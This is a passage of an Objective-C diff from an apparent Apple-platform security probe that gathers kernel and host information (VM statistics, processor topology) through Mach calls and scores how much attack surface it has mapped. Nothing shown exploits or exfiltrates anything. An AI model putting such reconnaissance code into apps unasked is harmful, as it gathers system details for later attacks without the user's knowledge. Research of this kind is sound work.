+                     hostInfo.max_cpus, hostInfo.avail_cpus, (uint64_t)hostInfo.max_mem,
+                     hostInfo.cpu_type, hostInfo.cpu_subtype]);
+            }
+
+            vm_statistics64_data_t vmStats;
+            count = HOST_VM_INFO64_COUNT;
+            kr = host_statistics64(mach_host_self(), HOST_VM_INFO64, (host_info64_t)&vmStats, &count);
+            if (kr == KERN_SUCCESS) {
+                totalInfoHarvested++;
+                log([NSString stringWithFormat:@"TASKINTRO: free=%llu active=%llu inactive=%llu wire=%llu",
+                     (uint64_t)vmStats.free_count, (uint64_t)vmStats.active_count,
+                     (uint64_t)vmStats.inactive_count, (uint64_t)vmStats.wire_count]);
+                log([NSString stringWithFormat:@"TASKINTRO: zero_fill=%llu reactivations=%llu pageins=%llu pageouts=%llu",
+                     vmStats.zero_fill_count, vmStats.reactivations,
+                     vmStats.pageins, vmStats.pageouts]);
+            }
+        }
+
+        // Step 7: processor info
+        if (!isr_stopped()) {
+            log(@"TASKINTRO: Step 7 — Processor topology");
+
+            host_t host = mach_host_self();
+            processor_info_array_t procInfo;
+            mach_msg_type_number_t procCount;
+            natural_t numProcs;
+
+            kern_return_t kr = host_processor_info(host, PROCESSOR_CPU_LOAD_INFO, &numProcs, &procInfo, &procCount);
+            if (kr == KERN_SUCCESS) {
+                totalInfoHarvested++;
+                log([NSString stringWithFormat:@"TASKINTRO: %u processors detected", numProcs]);
+                vm_deallocate(mach_task_self(), (vm_address_t)procInfo, procCount * sizeof(natural_t));
+            }
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"TASKINTRO: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"TASKINTRO: regions=%d shared=%d commpage=%d kernVer=%llu totalInfo=%d anomalies=%d",
+             regionsFound, sharedRegions, commpageDataPts, kernelVersion, totalInfoHarvested, anomalies]);
+
+        NSString *verdict;
+        if (commpageDataPts > 0 && anomalies > 10) verdict = @"CRITICAL — commpage readable + kernel data harvested!";
+        else if (anomalies > 10) verdict = @"HIGH — significant kernel info harvested!";
+        else if (commpageDataPts > 0) verdict = @"HIGH — commpage readable, kernel info exposed";
+        else if (sharedRegions > 10) verdict = @"MEDIUM — many shared regions found, attack surface mapped";
+        else if (totalInfoHarvested > 5) verdict = @"MEDIUM — substantial kernel info collected";
+        else verdict = @"LOW — limited kernel information available";
+        log([NSString stringWithFormat:@"TASKINTRO: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"regionsFound": @(regionsFound),
+            @"sharedRegions": @(sharedRegions),
+            @"commpageDataPts": @(commpageDataPts),
+            @"kernelVersion": @(kernelVersion),
+            @"totalInfoHarvested": @(totalInfoHarvested)
+        };
+        isr_checkpoint(@"ISR-TaskIntro-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
